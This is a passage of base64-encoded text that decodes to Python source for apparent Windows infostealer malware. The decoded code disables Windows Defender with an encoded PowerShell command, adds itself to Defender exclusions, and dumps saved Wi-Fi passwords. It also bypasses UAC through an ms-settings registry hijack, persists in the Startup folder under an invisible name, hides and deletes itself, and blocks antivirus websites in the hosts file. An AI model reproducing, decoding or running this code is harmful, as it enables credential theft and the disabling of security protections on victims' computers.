GVuY3J5cHRlZF9kYXRhKSwgY3R5cGVzLmNhc3QoCiAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfZGF0YSwgY3R5cGVzLlBPSU5URVIoY3R5cGVzLmNfdWJ5dGUpKSkKICAgICAgICAgICAgcERhdGFPdXQgPSBEQVRBX0JMT0IoKQogICAgICAgICAgICBwT3B0aW9uYWxFbnRyb3B5ID0gTm9uZQogICAgICAgICAgICBpZiBvcHRpb25hbF9lbnRyb3B5IGlzIG5vdCBOb25lOgogICAgICAgICAgICAgICAgb3B0aW9uYWxfZW50cm9weSA9IG9wdGlvbmFsX2VudHJvcHkuZW5jb2RlKCd1dGYtMTYnKQogICAgICAgICAgICAgICAgcE9wdGlvbmFsRW50cm9weSA9IERBVEFfQkxPQihsZW4ob3B0aW9uYWxfZW50cm9weSksIGN0eXBlcy5jYXN0KAogICAgICAgICAgICAgICAgICAgIG9wdGlvbmFsX2VudHJvcHksIGN0eXBlcy5QT0lOVEVSKGN0eXBlcy5jX3VieXRlKSkpCiAgICAgICAgICAgIGlmIGN0eXBlcy53aW5kbGwuQ3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoY3R5cGVzLmJ5cmVmKHBEYXRhSW4pLCBOb25lLCBjdHlwZXMuYnlyZWYocE9wdGlvbmFsRW50cm9weSkgaWYgcE9wdGlvbmFsRW50cm9weSBpcyBub3QgTm9uZSBlbHNlIE5vbmUsIE5vbmUsIE5vbmUsIDAsIGN0eXBlcy5ieXJlZihwRGF0YU91dCkpOgogICAgICAgICAgICAgICAgZGF0YSA9IChjdHlwZXMuY191Ynl0ZSAqIHBEYXRhT3V0LmNiRGF0YSkoKQogICAgICAgICAgICAgICAgY3R5cGVzLm1lbW1vdmUoZGF0YSwgcERhdGFPdXQucGJEYXRhLCBwRGF0YU91dC5jYkRhdGEpCiAgICAgICAgICAgICAgICBjdHlwZXMud2luZGxsLktlcm5lbDMyLkxvY2FsRnJlZShwRGF0YU91dC5wYkRhdGEpCiAgICAgICAgICAgICAgICByZXR1cm4gYnl0ZXMoZGF0YSkKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcignSW52YWxpZCBlbmNyeXB0ZWRfZGF0YSBwcm92aWRlZCEnKQoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEhpZGVDb25zb2xlKCkgLT4gTm9uZToKICAgICAgICAgICAgY3R5cGVzLndpbmRsbC51c2VyMzIuU2hvd1dpbmRvdygKICAgICAgICAgICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuR2V0Q29uc29sZVdpbmRvdygpLCAwKQoKICAgIGNsYXNzIFV0aWxpdHk6CgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgR2V0U2VsZigpIC0+IHR1cGxlW3N0ciwgYm9vbF06CiAgICAgICAgICAgIGlmIGhhc2F0dHIoc3lzLCAnZnJvemVuJyk6CiAgICAgICAgICAgICAgICByZXR1cm4gKHN5cy5leGVjdXRhYmxlLCBUcnVlKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuIChfX2ZpbGVfXywgRmFsc2UpCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgVGFza0tpbGwoKnRhc2tzOiBzdHIpIC0+IE5vbmU6CiAgICAgICAgICAgIHRhc2tzID0gbGlzdChtYXAobGFtYmRhIHg6IHgubG93ZXIoKSwgdGFza3MpKQogICAgICAgICAgICBvdXQgPSBzdWJwcm9jZXNzLnJ1bigndGFza2xpc3QgL0ZPIExJU1QnLCBzaGVsbD1UcnVlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXB0dXJlX291dHB1dD1UcnVlKS5zdGRvdXQuZGVjb2RlKGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5zcGxpdCgnXHJcblxyXG4nKQogICAgICAgICAgICBmb3IgaSBpbiBvdXQ6CiAgICAgICAgICAgICAgICBpID0gaS5zcGxpdCgnXHJcbicpWzoyXQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIG5hbWUsIHBpZCA9IChpWzBdLnNwbGl0KClbLTFdLCBpbnQoaVsxXS5zcGxpdCgpWy0xXSkpCiAgICAgICAgICAgICAgICAgICAgbmFtZSA9IG5hbWVbOi00XSBpZiBuYW1lLmVuZHN3aXRoKCcuZXhlJykgZWxzZSBuYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgbmFtZS5sb3dlcigpIGluIHRhc2tzOgogICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bigndGFza2tpbGwgL0YgL1BJRCAlZCcgJQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwaWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBVQUNQcm9tcHQocGF0aDogc3RyKSAtPiBib29sOgogICAgICAgICAgICByZXR1cm4gY3R5cGVzLndpbmRsbC5zaGVsbDMyLlNoZWxsRXhlY3V0ZVcoTm9uZSwgJ3J1bmFzJywgcGF0aCwgJyAnLmpvaW4oc3lzLmFyZ3YpLCBOb25lLCAxKSA9PSA0MgoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIERpc2FibGVEZWZlbmRlcigpIC0+IE5vbmU6CiAgICAgICAgICAgIGNvbW1hbmQgPSBiYXNlNjQuYjY0ZGVjb2RlKGInY0c5M1pYSnphR1ZzYkNCVFpYUXRUWEJRY21WbVpYSmxibU5sSUMxRWFYTmhZbXhsU1c1MGNuVnphVzl1VUhKbGRtVnVkR2x2YmxONWMzUmxiU0FrZEhKMVpTQXRSR2x6WVdKc1pVbFBRVlpRY205MFpXTjBhVzl1SUNSMGNuVmxJQzFFYVhOaFlteGxVbVZoYkhScGJXVk5iMjVwZEc5eWFXNW5JQ1IwY25WbElDMUVhWE5oWW14bFUyTnlhWEIwVTJOaGJtNXBibWNnSkhSeWRXVWdMVVZ1WVdKc1pVTnZiblJ5YjJ4c1pXUkdiMnhrWlhKQlkyTmxjM01nUkdsellXSnNaV1FnTFVWdVlXSnNaVTVsZEhkdmNtdFFjbTkwWldOMGFXOXVJRUYxWkdsMFRXOWtaU0F0Um05eVkyVWdMVTFCVUZOU1pYQnZjblJwYm1jZ1JHbHpZV0pzWldRZ0xWTjFZbTFwZEZOaGJYQnNaWE5EYjI1elpXNTBJRTVsZG1WeVUyVnVaQ0FtSmlCd2IzZGxjbk5vWld4c0lGTmxkQzFOY0ZCeVpXWmxjbVZ1WTJVZ0xWTjFZbTFwZEZOaGJYQnNaWE5EYjI1elpXNTBJRElnSmlBaUpWQnliMmR5WVcxR2FXeGxjeVZjVjJsdVpHOTNjeUJFWldabGJtUmxjbHhOY0VOdFpGSjFiaTVsZUdVaUlDMVNaVzF2ZG1WRVpXWnBibWwwYVc5dWN5QXRRV3hzJykuZGVjb2RlKGVycm9ycz0naWdub3JlJykKICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbigKICAgICAgICAgICAgICAgIGNvbW1hbmQsIHNoZWxsPVRydWUsIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTkVXX0NPTlNPTEUgfCBzdWJwcm9jZXNzLlNXX0hJREUpCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgRXhjbHVkZUZyb21EZWZlbmRlcihwYXRoOiBzdHIgPSBOb25lKSAtPiBOb25lOgogICAgICAgICAgICBpZiBwYXRoIGlzIE5vbmU6CiAgICAgICAgICAgICAgICBwYXRoID0gVXRpbGl0eS5HZXRTZWxmKClbMF0KICAgICAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbigicG93ZXJzaGVsbCAtQ29tbWFuZCBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICd7fSciLmZvcm1hdCgKICAgICAgICAgICAgICAgIHBhdGgpLCBzaGVsbD1UcnVlLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05FV19DT05TT0xFIHwgc3VicHJvY2Vzcy5TV19ISURFKQoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEdldFJhbmRvbVN0cmluZyhsZW5ndGg6IGludCA9IDUsIGludmlzaWJsZTogYm9vbCA9IEZhbHNlKToKICAgICAgICAgICAgaWYgaW52aXNpYmxlOgogICAgICAgICAgICAgICAgcmV0dXJuICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoWydceGEwJywgY2hyKDgyMzkpXSArIFtjaHIoeCkgZm9yIHggaW4gcmFuZ2UoODE5MiwgODIwOCldLCBrPWxlbmd0aCkpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXR1cm4gJycuam9pbihyYW5kb20uY2hvaWNlcygnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODknLCBrPWxlbmd0aCkpCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgR2V0V2lmaVBhc3N3b3JkcygpIC0+IGRpY3Q6CiAgICAgICAgICAgIHByb2ZpbGVzID0gbGlzdCgpCiAgICAgICAgICAgIHBhc3N3b3JkcyA9IGRpY3QoKQogICAgICAgICAgICBmb3IgbGluZSBpbiBzdWJwcm9jZXNzLnJ1bignbmV0c2ggd2xhbiBzaG93IHByb2ZpbGUnLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKS5zdGRvdXQuZGVjb2RlKGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5zcGxpdGxpbmVzKCk6CiAgICAgICAgICAgICAgICBpZiAnQWxsIFVzZXIgUHJvZmlsZScgaW4gbGluZToKICAgICAgICAgICAgICAgICAgICBuYW1lID0gbGluZVtsaW5lLmZpbmQoJzonKSArIDE6XS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgcHJvZmlsZXMuYXBwZW5kKG5hbWUpCiAgICAgICAgICAgIGZvciBwcm9maWxlIGluIHByb2ZpbGVzOgogICAgICAgICAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gc3VicHJvY2Vzcy5ydW4oZiduZXRzaCB3bGFuIHNob3cgcHJvZmlsZSAie3Byb2ZpbGV9IiBrZXk9Y2xlYXInLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKS5zdGRvdXQuZGVjb2RlKGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5zcGxpdGxpbmVzKCk6CiAgICAgICAgICAgICAgICAgICAgaWYgJ0tleSBDb250ZW50JyBpbiBsaW5lOgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzd29yZHNbcHJvZmlsZV0gPSBsaW5lW2xpbmUuZmluZCgnOicpICsgMTpdLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgZm91bmQgPSBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBpZiBub3QgZm91bmQ6CiAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmRzW3Byb2ZpbGVdID0gJyhOb25lKScKICAgICAgICAgICAgcmV0dXJuIHBhc3N3b3JkcwoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEdldExua1RhcmdldChwYXRoX3RvX2xuazogc3RyKSAtPiBzdHIgfCBOb25lOgogICAgICAgICAgICB0YXJnZXQgPSBOb25lCiAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGhfdG9fbG5rKToKICAgICAgICAgICAgICAgIG91dHB1dCA9IHN1YnByb2Nlc3MucnVuKCd3bWljIHBhdGggd2luMzJfc2hvcnRjdXRmaWxlIHdoZXJlIG5hbWU9IiVzIiBnZXQgdGFyZ2V0IC92YWx1ZScgJSBvcy5wYXRoLmFic3BhdGgoCiAgICAgICAgICAgICAgICAgICAgcGF0aF90b19sbmspLnJlcGxhY2UoJ1xcJywgJ1xcXFwnKSwgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkuc3Rkb3V0LmRlY29kZSgpCiAgICAgICAgICAgICAgICBpZiBvdXRwdXQ6CiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gb3V0cHV0LnNwbGl0bGluZXMoKToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGluZS5zdGFydHN3aXRoKCdUYXJnZXQ9Jyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wID0gbGluZS5sc3RyaXAoJ1RhcmdldD0nKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh0ZW1wKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXJnZXQgPSB0ZW1wCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgcmV0dXJuIHRhcmdldAoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEdldExua0Zyb21TdGFydE1lbnUoYXBwOiBzdHIpIC0+IGxpc3Rbc3RyXToKICAgICAgICAgICAgc2hvcnRjdXRQYXRocyA9IFtdCiAgICAgICAgICAgIHN0YXJ0TWVudVBhdGhzID0gW29zLnBhdGguam9pbihvcy5lbnZpcm9uWydBUFBEQVRBJ10sICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJyksIG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICdDOlxcJywgJ1Byb2dyYW1EYXRhJywgJ01pY3Jvc29mdCcsICdXaW5kb3dzJywgJ1N0YXJ0IE1lbnUnLCAnUHJvZ3JhbXMnKV0KICAgICAgICAgICAgZm9yIHN0YXJ0TWVudVBhdGggaW4gc3RhcnRNZW51UGF0aHM6CiAgICAgICAgICAgICAgICBmb3Igcm9vdCwgXywgZmlsZXMgaW4gb3Mud2FsayhzdGFydE1lbnVQYXRoKToKICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZmlsZS5sb3dlcigpID09ICclcy5sbmsnICUgYXBwLmxvd2VyKCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaG9ydGN1dFBhdGhzLmFwcGVuZChvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkpCiAgICAgICAgICAgIHJldHVybiBzaG9ydGN1dFBhdGhzCgogICAgICAgIEBzdGF0aWNtZXRob2QKICAgICAgICBkZWYgSXNBZG1pbigpIC0+IGJvb2w6CiAgICAgICAgICAgIHJldHVybiBjdHlwZXMud2luZGxsLnNoZWxsMzIuSXNVc2VyQW5BZG1pbigpID09IDEKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBVQUNieXBhc3MobWV0aG9kOiBpbnQgPSAxKSAtPiBib29sOgogICAgICAgICAgICBpZiBVdGlsaXR5LkdldFNlbGYoKVsxXToKICAgICAgICAgICAgICAgIGRlZiBleGVjdXRlKGNtZCk6IHJldHVybiBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgICAgICAgICBjbWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpCiAgICAgICAgICAgICAgICBtYXRjaCBtZXRob2Q6CiAgICAgICAgICAgICAgICAgICAgY2FzZSAxOgogICAgICAgICAgICAgICAgICAgICAgICBleGVjdXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZidyZWcgYWRkIGhrY3VcXFNvZnR3YXJlXFxDbGFzc2VzXFxtcy1zZXR0aW5nc1xcc2hlbGxcXG9wZW5cXGNvbW1hbmQgL2QgIntzeXMuZXhlY3V0YWJsZX0iIC9mJykKICAgICAgICAgICAgICAgICAgICAgICAgZXhlY3V0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdyZWcgYWRkIGhrY3VcXFNvZnR3YXJlXFxDbGFzc2VzXFxtcy1zZXR0aW5nc1xcc2hlbGxcXG9wZW5cXGNvbW1hbmQgL3YgIkRlbGVnYXRlRXhlY3V0ZSIgL2YnKQogICAgICAgICAgICAgICAgICAgICAgICBsb2dfY291bnRfYmVmb3JlID0gbGVuKGV4ZWN1dGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd2V2dHV0aWwgcWUgIk1pY3Jvc29mdC1XaW5kb3dzLVdpbmRvd3MgRGVmZW5kZXIvT3BlcmF0aW9uYWwiIC9mOnRleHQnKS5zdGRvdXQpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4ZWN1dGUoJ2NvbXB1dGVyZGVmYXVsdHMgLS1ub3VhY2J5cGFzcycpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ19jb3VudF9hZnRlciA9IGxlbihleGVjdXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dldnR1dGlsIHFlICJNaWNyb3NvZnQtV2luZG93cy1XaW5kb3dzIERlZmVuZGVyL09wZXJhdGlvbmFsIiAvZjp0ZXh0Jykuc3Rkb3V0KQogICAgICAgICAgICAgICAgICAgICAgICBleGVjdXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3JlZyBkZWxldGUgaGtjdVxcU29mdHdhcmVcXENsYXNzZXNcXG1zLXNldHRpbmdzIC9mJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbG9nX2NvdW50X2FmdGVyID4gbG9nX2NvdW50X2JlZm9yZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBVdGlsaXR5LlVBQ2J5cGFzcyhtZXRob2QgKyAxKQogICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgZXhlY3V0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYncmVnIGFkZCBoa2N1XFxTb2Z0d2FyZVxcQ2xhc3Nlc1xcbXMtc2V0dGluZ3NcXHNoZWxsXFxvcGVuXFxjb21tYW5kIC9kICJ7c3lzLmV4ZWN1dGFibGV9IiAvZicpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4ZWN1dGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAncmVnIGFkZCBoa2N1XFxTb2Z0d2FyZVxcQ2xhc3Nlc1xcbXMtc2V0dGluZ3NcXHNoZWxsXFxvcGVuXFxjb21tYW5kIC92ICJEZWxlZ2F0ZUV4ZWN1dGUiIC9mJykKICAgICAgICAgICAgICAgICAgICAgICAgbG9nX2NvdW50X2JlZm9yZSA9IGxlbihleGVjdXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dldnR1dGlsIHFlICJNaWNyb3NvZnQtV2luZG93cy1XaW5kb3dzIERlZmVuZGVyL09wZXJhdGlvbmFsIiAvZjp0ZXh0Jykuc3Rkb3V0KQogICAgICAgICAgICAgICAgICAgICAgICBleGVjdXRlKCdmb2RoZWxwZXIgLS1ub3VhY2J5cGFzcycpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ19jb3VudF9hZnRlciA9IGxlbihleGVjdXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dldnR1dGlsIHFlICJNaWNyb3NvZnQtV2luZG93cy1XaW5kb3dzIERlZmVuZGVyL09wZXJhdGlvbmFsIiAvZjp0ZXh0Jykuc3Rkb3V0KQogICAgICAgICAgICAgICAgICAgICAgICBleGVjdXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3JlZyBkZWxldGUgaGtjdVxcU29mdHdhcmVcXENsYXNzZXNcXG1zLXNldHRpbmdzIC9mJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbG9nX2NvdW50X2FmdGVyID4gbG9nX2NvdW50X2JlZm9yZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBVdGlsaXR5LlVBQ2J5cGFzcyhtZXRob2QgKyAxKQogICAgICAgICAgICAgICAgICAgIGNhc2UgXzoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIElzSW5TdGFydHVwKCkgLT4gYm9vbDoKICAgICAgICAgICAgcGF0aCA9IG9zLnBhdGguZGlybmFtZShVdGlsaXR5LkdldFNlbGYoKVswXSkKICAgICAgICAgICAgcmV0dXJuIG9zLnBhdGguYmFzZW5hbWUocGF0aCkubG93ZXIoKSA9PSAnc3RhcnR1cCcKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBQdXRJblN0YXJ0dXAoKSAtPiBzdHI6CiAgICAgICAgICAgIFNUQVJUVVBESVIgPSAnQzpcXFByb2dyYW1EYXRhXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydFVwJwogICAgICAgICAgICBmaWxlLCBpc0V4ZWN1dGFibGUgPSBVdGlsaXR5LkdldFNlbGYoKQogICAgICAgICAgICBpZiBpc0V4ZWN1dGFibGU6CiAgICAgICAgICAgICAgICBvdXQgPSBvcy5wYXRoLmpvaW4oU1RBUlRVUERJUiwgJ3t9LnNjcicuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgIFV0aWxpdHkuR2V0UmFuZG9tU3RyaW5nKGludmlzaWJsZT1UcnVlKSkpCiAgICAgICAgICAgICAgICBvcy5tYWtlZGlycyhTVEFSVFVQRElSLCBleGlzdF9vaz1UcnVlKQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5KGZpbGUsIG91dCkKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICAgICAgICAgIHJldHVybiBvdXQKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBJc0Nvbm5lY3RlZFRvSW50ZXJuZXQoKSAtPiBib29sOgogICAgICAgICAgICBodHRwID0gUG9vbE1hbmFnZXIoY2VydF9yZXFzPSdDRVJUX05PTkUnKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXR1cm4gaHR0cC5yZXF1ZXN0KCdHRVQnLCAnaHR0cHM6Ly9nc3RhdGljLmNvbS9nZW5lcmF0ZV8yMDQnKS5zdGF0dXMgPT0gMjA0CiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBEZWxldGVTZWxmKCk6CiAgICAgICAgICAgIHBhdGgsIGlzRXhlY3V0YWJsZSA9IFV0aWxpdHkuR2V0U2VsZigpCiAgICAgICAgICAgIGlmIGlzRXhlY3V0YWJsZToKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oJ3BpbmcgbG9jYWxob3N0IC1uIDMgPiBOVUwgJiYgZGVsIC9BIEggL0YgInt9IicuZm9ybWF0KHBhdGgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaGVsbD1UcnVlLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05FV19DT05TT0xFIHwgc3VicHJvY2Vzcy5TV19ISURFKQogICAgICAgICAgICAgICAgb3MuX2V4aXQoMCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShwYXRoKQoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEhpZGVTZWxmKCkgLT4gTm9uZToKICAgICAgICAgICAgcGF0aCwgXyA9IFV0aWxpdHkuR2V0U2VsZigpCiAgICAgICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oJ2F0dHJpYiAraCArcyAie30iJy5mb3JtYXQocGF0aCksIHNoZWxsPVRydWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRpb25mbGFncz1zdWJwcm9jZXNzLkNSRUFURV9ORVdfQ09OU09MRSB8IHN1YnByb2Nlc3MuU1dfSElERSkKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBCbG9ja1NpdGVzKCkgLT4gTm9uZToKICAgICAgICAgICAgaWYgVXRpbGl0eS5Jc0FkbWluKCk6CiAgICAgICAgICAgICAgICBjYWxsID0gc3VicHJvY2Vzcy5ydW4oCiAgICAgICAgICAgICAgICAgICAgJ1JFRyBRVUVSWSBIS0VZX0xPQ0FMX01BQ0hJTkVcXFNZU1RFTVxcQ3VycmVudENvbnRyb2xTZXRcXFNlcnZpY2VzXFxUY3BpcFxcUGFyYW1ldGVycyAvViBEYXRhQmFzZVBhdGgnLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQogICAgICAgICAgICAgICAgaWYgY2FsbC5yZXR1cm5jb2RlICE9IDA6CiAgICAgICAgICAgICAgICAgICAgaG9zdGRpcnBhdGggPSBvcy5wYXRoLmpvaW4oJ1N5c3RlbTMyJywgJ2RyaXZlcnMnLCAnZXRjJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaG9zdGRpcnBhdGggPSBvcy5zZXAuam9pbihjYWxsLnN0ZG91dC5kZWNvZGUoCiAgICAgICAgICAgICAgICAgICAgICAgIGVycm9ycz0naWdub3JlJykuc3RyaXAoKS5zcGxpdGxpbmVzKClbLTFdLnNwbGl0KClbLTFdLnNwbGl0KG9zLnNlcClbMTpdKQogICAgICAgICAgICAgICAgaG9zdGZpbGVwYXRoID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgIG9zLmdldGVudignc3lzdGVtcm9vdCcpLCBob3N0ZGlycGF0aCwgJ2hvc3RzJykKICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShob3N0ZmlsZXBhdGgpOgogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGhvc3RmaWxlcGF0aCkgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICBkYXRhID0gZmlsZS5yZWFkbGluZXMoKQogICAgICAgICAgICAgICAgQkFOTkVEX1NJVEVTID0gKCd2aXJ1c3RvdGFsLmNvbScsICdhdmFzdC5jb20nLCAndG90YWxhdi5jb20nLCAnc2Nhbmd1YXJkLmNvbScsICd0b3RhbGFkYmxvY2suY29tJywgJ3BjcHJvdGVjdC5jb20nLCAnbWNhZmVlLmNvbScsICdiaXRkZWZlbmRlci5jb20nLCAndXMubm9ydG9uLmNvbScsICdhdmcuY29tJywgJ21hbHdhcmVieXRlcy5jb20nLCAncGFuZGFzZWN1cml0eS5jb20nLCAnYXZpcmEuY29tJywgJ25vcnRvbi5jb20nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlc2V0LmNvbScsICd6aWxseWEuY29tJywgJ2thc3BlcnNreS5jb20nLCAndXNhLmthc3BlcnNreS5jb20nLCAnc29waG9zLmNvbScsICdob21lLnNvcGhvcy5jb20nLCAnYWRhd2FyZS5jb20nLCAnYnVsbGd1YXJkLmNvbScsICdjbGFtYXYubmV0JywgJ2Ryd2ViLmNvbScsICdlbXNpc29mdC5jb20nLCAnZi1zZWN1cmUuY29tJywgJ3pvbmVhbGFybS5jb20nLCAndHJlbmRtaWNyby5jb20nLCAnY2NsZWFuZXIuY29tJykKICAgICAgICAgICAgICAgIG5ld2RhdGEgPSBbXQogICAgICAgICAgICAgICAgZm9yIGkgaW4gZGF0YToKICAgICAgICAgICAgICAgICAgICBpZiBhbnkoW3ggaW4gaSBmb3IgeCBpbiBCQU5ORURfU0lURVNdKToKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBuZXdkYXRhLmFwcGVuZChpKQogICAgICAgICAgICAgICAgZm9yIGkgaW4gQkFOTkVEX1NJVEVTOgogICAgICAgICAgICAgICAgICAgIG5ld2RhdGEuYXBwZW5kKCdcdDAuMC4wLjAge30nLmZvcm1hdChpKSkKICAgICAgICAgICAgICAgICAgICBuZXdkYXRhLmFwcGVuZCgnXHQwLjAuMC4wIHd3dy57fScuZm9ybWF0KGkpKQogICAgICAgICAgICAgICAgbmV3ZGF0YSA9ICdcbicuam9pbihuZXdkYXRhKS5yZXBsYWNlKCdcblxuJywgJ1xuJykKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKCdhdHRyaWIgLXIge30nLmZvcm1hdChob3N0ZmlsZXBhdGgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSkKICAgICAgICAgICAgICAgIHdpdGggb3Blbihob3N0ZmlsZXBhdGgsICd3JykgYXMgZmlsZToKICAgICAgICAgICAgICAgICAgICBmaWxlLndyaXRlKG5ld2RhdGEpCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bignYXR0cmliICtyIHt9Jy5mb3JtYXQoaG9zdGZpbGVwYXRoKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNoZW